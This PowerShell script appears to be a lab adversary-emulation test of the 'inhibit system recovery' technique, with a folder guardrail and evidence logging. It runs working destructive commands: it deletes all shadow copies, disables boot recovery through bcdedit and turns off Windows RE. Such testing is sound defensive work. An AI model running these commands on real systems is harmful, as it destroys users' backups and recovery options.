$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA063*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'; New-Item -ItemType Directory -Force -Path $ev | Out-Null
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$vss0 = & vssadmin.exe list shadows 2>&1 | Out-String
& vssadmin.exe delete shadows /all /quiet 2>&1 | Out-File (Join-Path $ev 'vssadmin.out') -Encoding ascii
$bcd0 = & bcdedit.exe /enum "{default}" 2>&1 | Out-String
& bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures 2>&1 | Out-File (Join-Path $ev 'bcdedit_bootstatuspolicy.out') -Encoding ascii
& bcdedit.exe /set "{default}" recoveryenabled no 2>&1 | Out-File (Join-Path $ev 'bcdedit_recoveryenabled.out') -Encoding ascii
$reg0 = & reagentc.exe /info 2>&1 | Out-String
& reagentc.exe /disable 2>&1 | Out-File (Join-Path $ev 'reagentc_disable.out') -Encoding ascii
$bcd1 = & bcdedit.exe /enum "{default}" 2>&1 | Out-String
$reg1 = & reagentc.exe /info 2>&1 | Out-String
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
$salida = @(
    "ata=ATA063", "tecnica=T1490", "fuente=ART_adaptado",
    "guid=43819286-91a9-4369-90ed-d31fb4da2c01+cf21060a-80b3-4238-a595-22525de4ab81",
    "t0=$t0", "t1=$t1",
    "bcdedit_recoveryenabled_no=" + [bool]($bcd1 -match 'recoveryenabled\s+No'),
    "bcdedit_bootstatuspolicy_ignore=" + [bool]($bcd1 -match 'IgnoreAllFailures'),
    "reagentc_disabled=" + [bool]($reg1 -match 'Disabled'),
    "vssadmin_list_antes_len=" + $vss0.Length
)
$salida | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
$bcd0 | Out-File -FilePath (Join-Path $ev 'bcdedit_antes.txt') -Encoding ascii
$bcd1 | Out-File -FilePath (Join-Path $ev 'bcdedit_despues.txt') -Encoding ascii
$reg1 | Out-File -FilePath (Join-Path $ev 'reagentc_despues.txt') -Encoding ascii
exit 0
